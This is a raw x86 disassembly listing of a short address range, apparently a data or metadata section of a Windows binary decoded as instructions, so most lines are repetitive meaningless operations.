  405877:	outs   dx,DWORD PTR ds:[esi]
  405878:	bound  eax,QWORD PTR [eax]
  40587a:	add    BYTE PTR [eax],al
  40587c:	add    BYTE PTR [eax],al
  40587e:	add    BYTE PTR [eax],al
  405880:	add    al,BYTE PTR [eax]
  405882:	add    BYTE PTR [ecx],al
  405884:	push   edi
  405885:	pop    ds
  405886:	mov    ds:0xa090b,al
  40588b:	add    BYTE PTR [eax],al
  40588d:	cli    
  40588e:	and    eax,0x160033
  405893:	add    BYTE PTR [ecx],al
  405895:	add    BYTE PTR [eax],al
  405897:	add    al,dl
  405899:	add    BYTE PTR [eax],al
  40589b:	add    BYTE PTR ds:0x65000000,bl
  4058a1:	add    BYTE PTR [eax],al
  4058a3:	add    dh,al
  4058a5:	add    BYTE PTR [eax],al
  4058a7:	add    bl,dl
  4058a9:	add    BYTE PTR [eax],al
  4058ab:	add    BYTE PTR [edx],dl
  4058ad:	add    BYTE PTR [eax],al
  4058af:	add    BYTE PTR [ebp+0x1],dh
  4058b2:	add    BYTE PTR [eax],al
  4058b4:	or     DWORD PTR [eax],eax
  4058b6:	add    BYTE PTR [eax],al
  4058b8:	das    
  4058b9:	add    BYTE PTR [eax],al
  4058bb:	add    BYTE PTR [eax+0x0],cl
  4058be:	add    BYTE PTR [eax],al
  4058c0:	or     DWORD PTR [eax],eax
  4058c2:	add    BYTE PTR [eax],al
  4058c4:	sbb    al,BYTE PTR [eax]
  4058c6:	add    BYTE PTR [eax],al
  4058c8:	and    BYTE PTR [eax],al
  4058ca:	add    BYTE PTR [eax],al
  4058cc:	push   es
  4058cd:	add    BYTE PTR [eax],al
  4058cf:	add    BYTE PTR [edx],bl
  4058d1:	add    BYTE PTR [eax],al
  4058d3:	add    BYTE PTR [ecx],al
  4058d5:	add    BYTE PTR [eax],al
  4058d7:	add    BYTE PTR [eax+eax*1],cl
  4058da:	add    BYTE PTR [eax],al
  4058dc:	or     al,0x0
  4058de:	add    BYTE PTR [eax],al
  4058e0:	add    al,0x0
  4058e2:	add    BYTE PTR [eax],al
  4058e4:	add    BYTE PTR [eax],al
  4058e6:	or     al,BYTE PTR [eax]
  4058e8:	add    DWORD PTR [eax],eax
  4058ea:	add    BYTE PTR [eax],al
  4058ec:	add    BYTE PTR [eax],al
  4058ee:	push   es
  4058ef:	add    dh,dh
  4058f1:	add    edi,ebp
  4058f3:	add    DWORD PTR [edx],ecx
  4058f5:	add    BYTE PTR [eax],dh
  4058f7:	add    dl,BYTE PTR [ecx]
  4058f9:	add    cl,BYTE PTR [edx]
  4058fb:	add    BYTE PTR [edx+0x2],ah
  4058fe:	inc    edx
  4058ff:	add    cl,BYTE PTR [edx]
  405901:	add    BYTE PTR [edx+eax*1+0x11],dh
  405905:	add    cl,BYTE PTR [edx]
  405907:	add    BYTE PTR [esi+0xe01fd02],cl
  40590d:	add    ah,cl
  40590f:	add    dh,BYTE PTR [ebp-0x18fff9fe]
  405915:	add    ch,bh
  405917:	add    DWORD PTR [esi],eax
  405919:	add    BYTE PTR [ebx],bl
  40591b:	add    edi,edx
  40591d:	add    al,BYTE PTR [esi]
  40591f:	add    BYTE PTR [ebx+eax*1],ah
  405922:	out    dx,eax
  405923:	add    DWORD PTR [edx],edx
  405925:	add    BYTE PTR [ebx+eax*1+0x16035f],al
  40592c:	into   
  40592d:	add    ebx,DWORD PTR [edi+0x3]
  405930:	sbb    al,BYTE PTR [eax]
  405932:	sbb    al,BYTE PTR [edi*8+0x5b001e03]
  405939:	add    al,0x34
  40593b:	add    al,0x1e
  40593d:	add    BYTE PTR [ebx+0x4],dh
  405940:	xor    al,0x4
  405942:	push   cs
  405943:	add    BYTE PTR [edi+0x6048c04],bl
  405949:	add    ah,al
  40594b:	add    al,0xb1
  40594d:	add    al,0x6
  40594f:	add    dh,cl
  405951:	add    al,0xef
  405953:	add    DWORD PTR [esi],eax
  405955:	add    dl,bl
  405957:	add    al,0xef
  405959:	add    DWORD PTR [esi],ebx
  40595b:	add    dh,ah
  40595d:	add    al,0x34
  40595f:	add    al,0xe
  405961:	add    al,bh
  405963:	add    al,0x8c
  405965:	add    al,0xe
  405967:	add    BYTE PTR [eax*1+0xe048c],cl
  40596e:	sbb    BYTE PTR ds:0xa048c,al
  405974:	sub    DWORD PTR ds:0x601fd,eax
  40597a:	pop    edx
  40597b:	add    eax,0x220549
  405980:	rol    BYTE PTR ds:0xa01ef,1
  405986:	aam    0x5
  405988:	std    
  405989:	add    DWORD PTR [esi],eax
  40598b:	add    BYTE PTR [edx],dh
  40598d:	push   es
  40598e:	dec    ecx
  40598f:	add    eax,0x642000a
  405994:	std    
  405995:	add    DWORD PTR [edx],ecx
  405997:	add    BYTE PTR [edi+0x6],ch
  40599a:	push   edx
  40599b:	push   es
  40599c:	or     al,BYTE PTR [eax]
  40599e:	xchg   ebx,eax
  40599f:	push   es
  4059a0:	inc    edx
  4059a1:	add    cl,BYTE PTR [edx]
  4059a3:	add    BYTE PTR [ebx+0xa065206],ah
  4059a9:	add    bl,dl
  4059ab:	push   es
  4059ac:	adc    DWORD PTR [edx],eax
  4059ae:	or     al,BYTE PTR [eax]
  4059b0:	cmc    
  4059b1:	push   es
  4059b2:	adc    DWORD PTR [edx],eax
  4059b4:	or     al,BYTE PTR [eax]
  4059b6:	imul   eax,DWORD PTR [edi],0x601fd
  4059bc:	mov    dh,0x7
  4059be:	pushf  
  4059bf:	pop    es
  4059c0:	push   es
  4059c1:	add    dh,cl
  4059c3:	pop    es
  4059c4:	out    dx,eax
  4059c5:	add    DWORD PTR [edx],ecx
  4059c7:	add    ch,bl
  4059c9:	pop    es
  4059ca:	std    
  4059cb:	add    DWORD PTR [edx],esp
  4059cd:	add    BYTE PTR [edx],ch
  4059cf:	or     BYTE PTR [edx],dl
  4059d1:	or     BYTE PTR [esi],cl
  4059d3:	add    BYTE PTR [eax+ecx*1-0x56],cl
  4059d7:	add    ah,BYTE PTR [edx]
  4059d9:	add    BYTE PTR [eax+0x6089308],ch
  4059df:	add    BYTE PTR [ebp+0x22097a09],dl
  4059e5:	add    BYTE PTR [edi+0x6099d09],dh
  4059eb:	add    BYTE PTR [ebx],bh
  4059ed:	or     bh,BYTE PTR [edx+0x9]
  4059f0:	push   es
  4059f1:	add    BYTE PTR [edx+ecx*1+0x601ef],ch
  4059f8:	mov    ch,0xa
  4059fa:	cli    
  4059fb:	add    al,BYTE PTR [esi]
  4059fd:	add    ch,dl
  4059ff:	or     bh,BYTE PTR [edx+0x9]
  405a02:	push   es
  405a03:	add    dh,bh
  405a05:	or     ebp,edi
  405a07:	add    DWORD PTR [esi],eax
  405a09:	add    BYTE PTR [eax],ah
  405a0b:	or     al,0xe
  405a0d:	or     al,0x6
  405a0f:	add    BYTE PTR [ebx+0xc],al
  405a12:	push   cs
  405a13:	or     al,0x12
  405a15:	add    BYTE PTR [ebx+0xc],dh
  405a18:	pop    edi
  405a19:	add    ebx,DWORD PTR [esi]
  405a1b:	add    ch,bl
  405a1d:	or     al,0x34
  405a1f:	add    al,0x6
  405a21:	add    BYTE PTR [edi+0x10],al
  405a24:	mov    cl,0x4
  405a26:	push   es
  405a27:	add    BYTE PTR [edx+0x10],ah
  405a2a:	mov    cl,0x4
  405a2c:	push   es
  405a2d:	add    al,dl
  405a2f:	adc    bh,ch
  405a31:	add    DWORD PTR [esi],eax
  405a33:	add    BYTE PTR [ecx+edx*1],dh
  405a36:	out    dx,eax
  405a37:	add    DWORD PTR [esi],esp
  405a39:	add    BYTE PTR [esi+0xe11a411],bh
  405a3f:	add    BYTE PTR [edi],bh
  405a41:	adc    al,0xb5
  405a43:	add    ah,BYTE PTR [edx]
  405a45:	add    BYTE PTR [ebp+0x14],ch
  405a48:	push   edi
  405a49:	adc    al,0x2a
  405a4b:	add    BYTE PTR [esp+edx*1+0x6149e],bh
  405a52:	ss adc eax,0x220549
  405a58:	fcom   DWORD PTR ds:0x1e0812
  405a5e:	sbb    DWORD PTR [esi],edx
  405a60:	xor    al,0x4
  405a62:	push   ds
  405a63:	add    BYTE PTR [ebp+0x6043416],dh
  405a69:	add    BYTE PTR [edi+edx*1+0xe01ef],dl
  405a70:	mov    cl,0x17
  405a72:	mov    ch,0x2
  405a74:	push   ds
  405a75:	add    BYTE PTR [edx],ch
  405a77:	sbb    BYTE PTR [esp+eax*1],dh
  405a7a:	push   ds
  405a7b:	add    BYTE PTR [ecx+0x18],dl
  405a7e:	xor    al,0x4
  405a80:	push   ds
  405a81:	add    BYTE PTR [ecx+0x18],ch
  405a84:	xor    al,0x4
  405a86:	push   ds
  405a87:	add    ah,al
  405a89:	sbb    BYTE PTR [esp+eax*1],dh
  405a8c:	push   es
  405a8d:	add    BYTE PTR [edx],al
  405a8f:	sbb    DWORD PTR [edx+0x9],edi
  405a92:	push   ds
  405a93:	add    BYTE PTR [ecx],cl
  405a95:	sbb    DWORD PTR [esp+eax*1],esi
  405a98:	push   es
  405a99:	add    BYTE PTR ds:0x601ef19,ah
  405a9f:	add    BYTE PTR [ebp+0x601ef19],al
  405aa5:	add    BYTE PTR [ecx+ebx*1+0x601ef],bh
  405aac:	inc    edx
  405aad:	sbb    bh,BYTE PTR [eax]
  405aaf:	sbb    al,BYTE PTR [esi]
  405ab1:	add    BYTE PTR [ebx+0x1a],dl
  405ab4:	mov    cl,0x4
  405ab6:	push   es
  405ab7:	add    bl,ah
  405ab9:	sbb    al,0xc4
  405abb:	sbb    al,0x6
  405abd:	add    BYTE PTR [ecx+0x601ef1f],bl
  405ac3:	add    BYTE PTR [edi+0x6099d20],cl
  405ac9:	add    BYTE PTR [eax+0x61cc420],ch
  405acf:	add    BYTE PTR [eax+eiz*1+0x601ef],bh
  405ad6:	shl    BYTE PTR [eax],cl
  405ad8:	push   cs
  405ad9:	or     al,0x6
  405adb:	add    cl,ch
  405add:	and    BYTE PTR [esi],cl
  405adf:	or     al,0x6
  405ae1:	add    BYTE PTR [esi],al
  405ae3:	and    DWORD PTR [esi],ecx
  405ae5:	or     al,0x6
  405ae7:	add    BYTE PTR [ecx+eiz*1],ah
  405aea:	push   cs
  405aeb:	or     al,0x6
  405aed:	add    BYTE PTR ds:0x60c0e21,bh
  405af3:	add    BYTE PTR [esi+0x21],dl
  405af6:	push   cs
  405af7:	or     al,0x6
  405af9:	add    BYTE PTR [ecx+0x21],dh
  405afc:	push   cs
  405afd:	or     al,0x6
  405aff:	add    BYTE PTR [edx+0x60c0e21],cl
  405b05:	add    BYTE PTR [edi+0x60c0e21],ah
  405b0b:	add    dh,bl
  405b0d:	and    ebp,ecx
  405b0f:	and    DWORD PTR [esi],eax
  405b11:	add    BYTE PTR [eax],al
  405b13:	and    cl,ch
  405b15:	and    DWORD PTR [esi],eax
  405b17:	add    BYTE PTR [edx],ah
  405b19:	and    cl,BYTE PTR [esi]
  405b1b:	or     al,0x6
  405b1d:	add    BYTE PTR ds:0x60c0e22,bh
  405b23:	add    BYTE PTR [esi+0x22],dl
  405b26:	push   cs
  405b27:	or     al,0x6
  405b29:	add    BYTE PTR [edx+eiz*1+0x62274],dl
  405b30:	lds    esp,FWORD PTR [edx]
  405b32:	mov    dl,0x22
  405b34:	xchg   DWORD PTR [ecx],eax
  405b36:	fldenv [edx]
  405b38:	add    BYTE PTR [eax],al
  405b3a:	push   es
  405b3b:	add    al,ch
  405b3d:	and    dh,BYTE PTR [edx+eiz*1+0x6]
  405b41:	add    BYTE PTR [eax],cl
  405b43:	and    esi,DWORD PTR [edx+eiz*1+0x6]
  405b47:	add    BYTE PTR [ebx],ah
  405b49:	and    ebp,edi
  405b4b:	add    DWORD PTR [esi],eax
  405b4d:	add    BYTE PTR [esi],dh
  405b4f:	and    ebp,edi
  405b51:	add    DWORD PTR [esi],eax
  405b53:	add    BYTE PTR [edx+0x23],dl
  405b56:	out    dx,eax
  405b57:	add    DWORD PTR [esi],eax
  405b59:	add    BYTE PTR [edx+0x23],bh
  405b5c:	out    dx,eax
  405b5d:	add    DWORD PTR [esi],eax
  405b5f:	add    BYTE PTR [edx+0x601ef23],dh
  405b65:	add    BYTE PTR [ecx+0x601ef23],bh
  405b6b:	add    ch,dl
  405b6d:	and    ebp,edi
  405b6f:	add    DWORD PTR [esi],eax
  405b71:	add    dl,bh
  405b73:	and    ebp,edi
  405b75:	add    DWORD PTR [esi],eax
  405b77:	add    BYTE PTR [ebx],bl
  405b79:	and    al,0xb2
  405b7b:	and    cl,BYTE PTR [edx]
  405b7d:	add    BYTE PTR [esp],bh
  405b80:	std    
  405b81:	add    DWORD PTR [edx],ecx
  405b83:	add    BYTE PTR [esi+0x24],bl
  405b86:	push   edx
  405b87:	push   es
  405b88:	add    BYTE PTR cs:[esp+0xa24b1],bh
  405b90:	add    ah,BYTE PTR ds:0xa01fd
  405b96:	and    al,0x25
  405b98:	std    
  405b99:	add    DWORD PTR [edx],esp
  405b9b:	add    BYTE PTR [ecx+0x25],ah
  405b9e:	dec    ebp
  405b9f:	and    eax,0x25850006
  405ba4:	dec    ecx
  405ba5:	add    eax,0x25940006
  405baa:	dec    ecx
  405bab:	add    eax,0x25ba0006
  405bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb1:	and    eax,0x25db0006
  405bb6:	out    dx,eax
  405bb7:	add    DWORD PTR [esi],eax
  405bb9:	add    bl,ah
  405bbb:	and    eax,0x2201ef
  405bc0:	sti    
  405bc1:	and    eax,0xa22b2
  405bc6:	cmp    eax,0x6065226
  405bcb:	add    BYTE PTR [ecx+0x26],dl
  405bce:	out    dx,eax
  405bcf:	add    DWORD PTR [esi],eax
  405bd1:	add    BYTE PTR [edx+0x26],dh
  405bd4:	bound  esp,QWORD PTR [esi]
  405bd6:	push   es
  405bd7:	add    BYTE PTR [ebx+0x26],bh
  405bda:	bound  esp,QWORD PTR [esi]
  405bdc:	push   es
  405bdd:	add    BYTE PTR [edi+0x601ef26],ah
  405be3:	add    BYTE PTR [ebp+0x6054926],ch
  405be9:	add    BYTE PTR [edx+0x6054926],bh
  405bef:	add    cl,ah
  405bf1:	es out dx,eax
  405bf3:	add    DWORD PTR [edx],ecx
  405bf5:	add    BYTE PTR ds:0xa01fd27,al
  405bfb:	add    BYTE PTR ds:0xa024227,dl
  405c01:	add    BYTE PTR [edi+0x27],dh
  405c04:	jp     0x405c0f
  405c06:	push   es
  405c07:	add    BYTE PTR [edi+eiz*1+0xa279d],bh
  405c0e:	int    0x27
  405c10:	inc    edx
  405c11:	add    cl,BYTE PTR [edx]
  405c13:	add    dh,ch
  405c15:	daa    
  405c16:	inc    edx
  405c17:	add    cl,BYTE PTR [edx]
  405c19:	add    BYTE PTR [eax+ebp*1],bl
  405c1c:	inc    edx
  405c1d:	add    cl,BYTE PTR [edx]
  405c1f:	add    BYTE PTR [esi],dh
  405c21:	sub    BYTE PTR [edx+0x2],al
  405c24:	or     al,BYTE PTR [eax]
  405c26:	dec    ecx
  405c27:	sub    BYTE PTR [edx+0x2],al
  405c2a:	push   ds
  405c2b:	add    BYTE PTR [ecx+0x28],dh
  405c2e:	xor    al,0x4
  405c30:	add    BYTE PTR cs:[esi+0xa249428],cl
  405c37:	add    bl,al
  405c39:	sub    BYTE PTR [ecx],dl
  405c3b:	add    cl,BYTE PTR [edx]
  405c3d:	add    ah,bh
  405c3f:	sub    BYTE PTR [edx+0x9],bh
  405c42:	or     al,BYTE PTR [eax]
  405c44:	sub    ebp,DWORD PTR [ecx]
  405c46:	push   edx
  405c47:	push   es
  405c48:	or     al,BYTE PTR [eax]
  405c4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c4b:	sub    ebp,edi
  405c4d:	add    DWORD PTR [esi],eax
  405c4f:	add    dh,ah
  405c51:	sub    DWORD PTR [edi+eax*1+0x2a3c001e],ebx
  405c58:	xor    al,0x4
  405c5a:	es add dh,dl
  405c5d:	sub    ah,BYTE PTR [ecx+edx*1+0x2b060006]
  405c64:	jp     0x405c6f
  405c66:	push   es
  405c67:	add    BYTE PTR [esi],bl
  405c69:	sub    edi,DWORD PTR [edx+0x9]
  405c6c:	push   es
  405c6d:	add    BYTE PTR [edx],dh
  405c6f:	sub    edi,DWORD PTR [edx+0x9]
  405c72:	push   es
  405c73:	add    BYTE PTR [eax+0x2b],al
  405c76:	jp     0x405c81
  405c78:	push   es
  405c79:	add    BYTE PTR [ecx+0x2b],dh
  405c7c:	mov    cl,0x4
  405c7e:	push   es
  405c7f:	add    BYTE PTR [ecx+0x61a382b],dh
  405c85:	add    BYTE PTR [edi+0x61a382b],bh
  405c8b:	add    cl,dl
  405c8d:	sub    edi,DWORD PTR [eax]
  405c8f:	sbb    al,BYTE PTR [esi]
  405c91:	add    BYTE PTR [ebx],al
  405c93:	sub    al,0x38
  405c95:	sbb    al,BYTE PTR [esi]
  405c97:	add    BYTE PTR [eax+0x13],dl
  405c9a:	cmp    BYTE PTR [edx],bl
  405c9c:	push   es
  405c9d:	add    BYTE PTR [edx],bh
  405c9f:	sub    al,0xef
  405ca1:	add    DWORD PTR [esi],eax
  405ca3:	add    BYTE PTR [edi],bh
  405ca5:	sub    al,0x49
  405ca7:	add    eax,0x2c560012
  405cac:	pop    edi
  405cad:	add    eax,DWORD PTR [esi]
  405caf:	add    BYTE PTR [ebp-0x44fe10d4],dh
  405cb5:	add    cl,dl
  405cb7:	sub    al,0x0
  405cb9:	add    BYTE PTR [esi],al
  405cbb:	add    ah,bl
  405cbd:	sub    al,0x7a
  405cbf:	or     DWORD PTR [esi],eax
  405cc1:	add    BYTE PTR ds:0xe01ef2d,cl
  405cc7:	add    BYTE PTR ds:0x6048c2d,dh
  405ccd:	add    BYTE PTR [eax+0x2d],ch
  405cd0:	mov    cl,0x4
  405cd2:	push   es
  405cd3:	add    BYTE PTR [edx+0x2d],bh
  405cd6:	out    dx,eax
  405cd7:	add    DWORD PTR [esi],eax
  405cd9:	add    cl,cl
  405cdb:	sub    eax,0x61a38
  405ce0:	fild   QWORD PTR ds:0x322dd3
  405ce6:	ucomiss xmm6,DWORD PTR [ecx+0x1d003224]
  405ced:	cs mov cl,0x24
  405cf0:	xor    al,BYTE PTR [eax]
  405cf2:	daa    
  405cf3:	cs mov cl,0x24
  405cf6:	and    al,BYTE PTR [eax]
  405cf8:	fwait
  405cf9:	cs jl  0x405d2a
  405cfc:	xor    al,BYTE PTR [eax]
  405cfe:	mov    ch,0x2e
  405d00:	mov    cl,0x24
  405d02:	or     al,BYTE PTR [eax]
  405d04:	leave  
  405d05:	cs std 
  405d07:	add    DWORD PTR [esi],eax
  405d09:	add    BYTE PTR ds:0x62ef52f,cl
  405d0f:	add    BYTE PTR [ecx],dh
  405d11:	das    
  405d12:	out    dx,eax
  405d13:	add    DWORD PTR [esi],ecx
  405d15:	add    BYTE PTR [ebp+0x2f],al
  405d18:	mov    ch,0x2
  405d1a:	push   cs
  405d1b:	add    BYTE PTR [ebp+0xe02b52f],bh
  405d21:	add    cl,bl
  405d23:	das    
  405d24:	mov    ch,0x2
  405d26:	sub    al,BYTE PTR [eax]
  405d28:	test   BYTE PTR [ebx],al
  405d2a:	pop    edi
  405d2b:	add    esp,DWORD PTR [edx]
  405d2d:	add    BYTE PTR [esi],dh
  405d2f:	xor    ch,bh
  405d31:	add    ebx,DWORD PTR [esi]
  405d33:	add    BYTE PTR [edx+0xa043430],ah
  405d39:	add    ah,ah
  405d3b:	xor    ch,bh
  405d3d:	add    DWORD PTR [esi],eax
  405d3f:	add    BYTE PTR [esi],cl
  405d41:	xor    edi,ebp
  405d43:	add    DWORD PTR [esi],eax
  405d45:	add    BYTE PTR [eax],ch
  405d47:	xor    DWORD PTR [esi],ecx
  405d49:	or     al,0x22
  405d4b:	add    BYTE PTR [ecx+0x31],dl
  405d4e:	inc    edx
  405d4f:	xor    DWORD PTR [esi],eax
  405d51:	add    BYTE PTR [ecx+0x31],ah
  405d54:	mov    cl,0x4
  405d56:	push   es
  405d57:	add    BYTE PTR [ebp+0x604b131],al
  405d5d:	add    BYTE PTR [ecx+0x604b131],dl
  405d63:	add    BYTE PTR [edi+0xe04b131],ah
  405d69:	add    BYTE PTR [edi+0xe02b531],dh
  405d6f:	add    BYTE PTR [esi+0x6328832],dl
  405d75:	add    cl,ch
  405d77:	xor    cl,BYTE PTR [esi]
  405d79:	or     al,0x6
  405d7b:	add    dh,dh
  405d7d:	xor    cl,BYTE PTR [esi]
  405d7f:	or     al,0xe
  405d81:	add    BYTE PTR [ebx],dh
  405d83:	xor    ebp,DWORD PTR [edx+0x48000e02]
  405d89:	xor    ebp,DWORD PTR [edx+0x5b000602]
  405d8f:	xor    ecx,DWORD PTR [esi]
  405d91:	or     al,0xe
  405d93:	add    BYTE PTR [eax+0x602aa33],cl
  405d99:	add    BYTE PTR [edi+0xe04b133],ch
  405d9f:	add    BYTE PTR [esi+0x602aa33],bh
  405da5:	add    bl,ah
  405da7:	xor    edi,edx
  405da9:	add    al,BYTE PTR [esi]
  405dab:	add    BYTE PTR [eax],bh
  405dad:	ss out dx,eax
  405daf:	add    DWORD PTR [esi],eax
  405db1:	add    BYTE PTR [esi+esi*1-0x11],dl
  405db5:	add    DWORD PTR [esi],ecx
  405db7:	add    BYTE PTR [esi+esi*1-0x56],bh
  405dbb:	add    al,BYTE PTR [esi]
  405dbd:	add    BYTE PTR [esi],cl
  405dbf:	aaa    
  405dc0:	cmp    BYTE PTR [edx],bl
  405dc2:	sbb    eax,DWORD PTR [ecx]
  405dc4:	shr    DWORD PTR [eax+eax*1],1
  405dc7:	add    BYTE PTR [esi],cl
  405dc9:	add    BYTE PTR [edx],ah
  405dcb:	aaa    
  405dcc:	mov    WORD PTR [eax+eax*1],es
  405dcf:	add    BYTE PTR [eax],al
  405dd1:	add    BYTE PTR [ecx],al
  405dd3:	add    BYTE PTR [eax],al
  405dd5:	add    BYTE PTR [eax],al
  405dd7:	add    BYTE PTR [ecx],al
  405dd9:	add    BYTE PTR [ecx],al
  405ddb:	add    BYTE PTR [eax],al
  405ddd:	add    BYTE PTR [eax],dl
  405ddf:	add    BYTE PTR [esi],ch
  405de1:	add    BYTE PTR [esi],dh
  405de3:	add    BYTE PTR ds:0x1000100,al
  405de9:	add    BYTE PTR [ebx],al
  405deb:	add    BYTE PTR [eax],dl
  405ded:	add    BYTE PTR [esi+0x0],dl
  405df0:	add    BYTE PTR [eax],al
  405df2:	add    eax,0xa000600
  405df7:	add    BYTE PTR [ebx],al
  405df9:	add    BYTE PTR [eax],dl
  405dfb:	add    BYTE PTR [edi+0x0],ah
  405dfe:	add    BYTE PTR [eax],al
  405e00:	add    eax,0x12000700
  405e05:	add    BYTE PTR [eax],al
  405e07:	add    BYTE PTR [eax],dl
  405e09:	add    BYTE PTR [eax+eax*1+0x36],bh
  405e0d:	add    BYTE PTR ds:0x19000a00,dl
  405e13:	add    BYTE PTR [eax],al
  405e15:	add    DWORD PTR [eax],edx
  405e17:	add    BYTE PTR [ebx+0x19003600],bl
  405e1d:	add    BYTE PTR [eax+eax*1],cl
  405e20:	sbb    eax,DWORD PTR [eax]
  405e22:	add    BYTE PTR [eax],al
  405e24:	adc    BYTE PTR [eax],al
  405e26:	mov    cl,0x0
  405e28:	add    BYTE PTR ss:0x22000d00,al
  405e2f:	add    BYTE PTR [eax],al
  405e31:	add    DWORD PTR [eax],edx
  405e33:	add    cl,cl
  405e35:	add    BYTE PTR [esi],dh
  405e37:	add    BYTE PTR ds:0x2a001500,bl
  405e3d:	add    BYTE PTR [eax],al
  405e3f:	add    BYTE PTR [eax],dl
  405e41:	add    cl,bl
  405e43:	add    BYTE PTR [esi],dh
  405e45:	add    BYTE PTR ds:0x2c001500,bl
  405e4b:	add    BYTE PTR [eax],al
  405e4d:	add    BYTE PTR [eax],dl
  405e4f:	add    al,dh
  405e51:	add    BYTE PTR [esi],dh
  405e53:	add    BYTE PTR [eax+eax*1],ah
  405e56:	sbb    eax,0x4900
  405e5b:	add    DWORD PTR [eax],edx
  405e5d:	add    BYTE PTR [eax],dl
  405e5f:	add    DWORD PTR [esi],esi
  405e61:	add    BYTE PTR ds:0x4e001f00,al
  405e67:	add    BYTE PTR ds:0x1b001000,al
  405e6d:	add    DWORD PTR [eax],eax
  405e6f:	add    BYTE PTR ds:0x63002b00,al
  405e75:	add    BYTE PTR [ebx],al
  405e77:	add    BYTE PTR [eax],dl
  405e79:	add    BYTE PTR [ebx],dh
  405e7b:	add    DWORD PTR [eax],eax
  405e7d:	add    BYTE PTR ds:0x65002b00,al
  405e83:	add    BYTE PTR [eax],al
  405e85:	add    BYTE PTR [eax],dl
  405e87:	add    BYTE PTR [ecx+eax*1+0x36],al
  405e8b:	add    BYTE PTR ds:0x67002b00,al
  405e91:	add    BYTE PTR [eax],al
  405e93:	add    BYTE PTR [eax],dl
  405e95:	add    BYTE PTR [esi+0x1],dl
  405e98:	add    BYTE PTR ss:0x6c002e00,al
  405e9f:	add    BYTE PTR [ecx],al
  405ea1:	add    BYTE PTR [eax],dl
  405ea3:	add    BYTE PTR [ecx+eax*1+0x36],ah
  405ea7:	add    BYTE PTR ds:0x73003400,bl
  405ead:	add    BYTE PTR [eax],al
  405eaf:	add    BYTE PTR [eax],dl
  405eb1:	add    BYTE PTR [ebp+0x1],dh
  405eb4:	add    BYTE PTR ss:0x92004300,bl
  405ebb:	add    BYTE PTR [eax],al
  405ebd:	add    BYTE PTR [eax],dl
  405ebf:	add    BYTE PTR [esi+0x1d003601],cl
  405ec5:	add    BYTE PTR [eax+eax*1-0x60],al
  405ec9:	add    BYTE PTR [eax],al
  405ecb:	add    BYTE PTR [eax],dl
  405ecd:	add    BYTE PTR [ebx+0x51003601],ch
  405ed3:	add    BYTE PTR [eax+eax*1-0x5c],al
  405ed7:	add    BYTE PTR [eax],al
  405ed9:	add    BYTE PTR [eax],dl
  405edb:	add    ch,al
  405edd:	add    DWORD PTR [esi],esi
  405edf:	add    BYTE PTR [ebp+0x0],dl
  405ee2:	inc    edi
  405ee3:	add    BYTE PTR [edi+0x10000000],ch
  405ee9:	add    bl,dl
  405eeb:	add    DWORD PTR [esi],esi
  405eed:	add    BYTE PTR [ecx+0x0],bl
  405ef0:	dec    ecx
  405ef1:	add    BYTE PTR [edx+0x10010300],dh
  405ef7:	add    BYTE PTR [edi+0x34],dl
  405efa:	add    BYTE PTR [eax],al
  405efc:	add    eax,0xb7004b00
  405f01:	add    BYTE PTR [ebx],al
  405f03:	add    DWORD PTR [eax],edx
  405f05:	add    BYTE PTR [esi+0x5000034],cl
  405f0b:	add    BYTE PTR [ebp+0x0],cl
  405f0e:	mov    ecx,0x10010300
  405f13:	add    ah,dl
  405f15:	xor    al,0x0
  405f17:	add    BYTE PTR ds:0xbb004f00,al
  405f1d:	add    BYTE PTR [ebx],al
  405f1f:	add    DWORD PTR [eax],edx
  405f21:	add    BYTE PTR [esi*1+0x50000],al
  405f28:	push   edi
  405f29:	add    BYTE PTR [ebp+0x10010300],bh
  405f2f:	add    BYTE PTR [esi],dh
  405f31:	xor    eax,0x50000
  405f36:	pop    ecx
  405f37:	add    BYTE PTR [edi+0x10010300],bh
  405f3d:	add    BYTE PTR [esi+0x35],ah
  405f40:	add    BYTE PTR [eax],al
  405f42:	add    eax,0xc1005c00
  405f47:	add    BYTE PTR [ebx],al
  405f49:	add    DWORD PTR [eax],edx
  405f4b:	add    BYTE PTR [eax+0x5000035],ch
  405f51:	add    BYTE PTR [edi+0x0],bl
  405f54:	ret    
  405f55:	add    BYTE PTR [ebx],al
  405f57:	add    DWORD PTR [eax],edx
  405f59:	add    bl,ah
  405f5b:	xor    eax,0x50000
  405f60:	bound  eax,QWORD PTR [eax]
  405f62:	lds    eax,FWORD PTR [eax]
  405f64:	adc    DWORD PTR [eax],eax
  405f66:	xor    eax,0x11001305
  405f6b:	add    BYTE PTR [ecx+0x5],ch
  405f6e:	pop    ss
  405f6f:	add    BYTE PTR [esi],dl
  405f71:	add    BYTE PTR [ebp+0x11002405],bl
  405f77:	add    BYTE PTR [edi],al
  405f79:	push   es
  405f7a:	aas    
  405f7b:	add    BYTE PTR [ecx],dl
  405f7d:	add    BYTE PTR [edi+0x105de23],al
  405f83:	add    BYTE PTR [ecx+0x5],ch
  405f86:	inc    esi
  405f87:	add    BYTE PTR [ecx-0x80],dl
  405f8a:	daa    
  405f8b:	pop    es
  405f8c:	test   DWORD PTR [eax],eax
  405f8e:	push   ecx
  405f8f:	cmp    BYTE PTR [edi+eax*1],0x85
  405f93:	add    BYTE PTR [ecx-0x80],dl
  405f96:	push   ebx
  405f97:	pop    es
  405f98:	test   DWORD PTR [eax],eax
  405f9a:	add    DWORD PTR [eax],eax
  405f9c:	leave  
  405f9d:	pop    es
  405f9e:	je     0x405fa1
  405fa0:	add    DWORD PTR [eax],eax
  405fa2:	rol    DWORD PTR [edi],cl
  405fa4:	jns    0x405fa7
  405fa6:	add    DWORD PTR [eax],eax
  405fa8:	inc    BYTE PTR [edi]
  405faa:	lea    eax,[ecx]
  405fac:	push   ecx
  405fad:	sub    bl,0x8
  405fb0:	test   DWORD PTR [eax],eax
  405fb2:	push   ecx
  405fb3:	add    BYTE PTR ds:0x51008509,0x80
  405fba:	sbb    BYTE PTR [ecx],cl
  405fbc:	test   DWORD PTR [eax],eax
  405fbe:	push   ecx
  405fbf:	sub    BYTE PTR [eax],0x9
  405fc2:	test   DWORD PTR [eax],eax
  405fc4:	add    DWORD PTR [eax],eax
  405fc6:	cmp    cl,BYTE PTR [ecx]
  405fc8:	test   DWORD PTR [eax],eax
  405fca:	add    DWORD PTR [eax],eax
  405fcc:	dec    edx
  405fcd:	or     DWORD PTR [ebp+0x5a000100],eax
  405fd3:	or     DWORD PTR [ebp+0x6a000100],eax
  405fd9:	or     DWORD PTR [ebp-0x3bfffc00],eax
